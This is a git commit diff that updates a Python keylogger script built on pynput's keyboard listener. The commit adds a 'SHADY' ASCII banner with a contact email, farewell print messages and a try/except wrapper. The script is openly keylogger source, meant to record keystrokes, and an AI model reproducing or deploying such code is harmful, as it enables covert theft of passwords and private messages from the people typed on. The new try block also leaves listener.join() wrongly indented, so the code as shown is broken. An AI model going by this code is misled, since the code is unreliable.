d572cad615f01a4743c7462c23b54324a7226fec
SHADY <58383473+MasterMind-404@users.noreply.github.com>
2024-06-19 07:39:15 -0400

    Update sha-keylogger.py

--- sha-keylogger.py
+++ sha-keylogger.py
@@ -1,3 +1,16 @@
+
+print(
+"""
+ .oooooo..o ooooo   ooooo   LOVE   .o.   YOU    oooooooooo.   oooooo   oooo 
+d8P'    `Y8 `888'   `888'   3000  .888.   :)    `888'   `Y8b   `888.   .8'  
+Y88bo.       888     888         .8"888.         888      888   `888. .8'   
+ `"Y8888o.   888ooooo888        .8' `888.        888      888    `888.8'    
+     `"Y88b  888     888       .88ooo8888.       888      888     `888'     
+oo     .d8P  888     888      .8'     `888.      888     d88'      888      
+8""88888P'  o888o   o888o    o88o     o8888o    o888bood8P'       o888o     
+                                                 ping me --gsaran1209@gmail.com   
+""")
+
 import time
 import logging
 from pynput import keyboard
@@ -13,9 +26,19 @@ def on_press(key):
 
 def on_release(key):
     if key == keyboard.Key.esc:
+        print("Love You 3000")
+        time.sleep(1) # wait for 1 second
+        print("SHADY")
+        time.sleep(1) # wait for 1 second
         # Stop listener
         return False
 
 # Collect events until released
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+try:
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
+except KeyboardInterrupt:
+    print("Love You 3000")
+    time.sleep(1) # wait for 1 second
+    print("SHADY")
+    time.sleep(1) # wait for 1 second
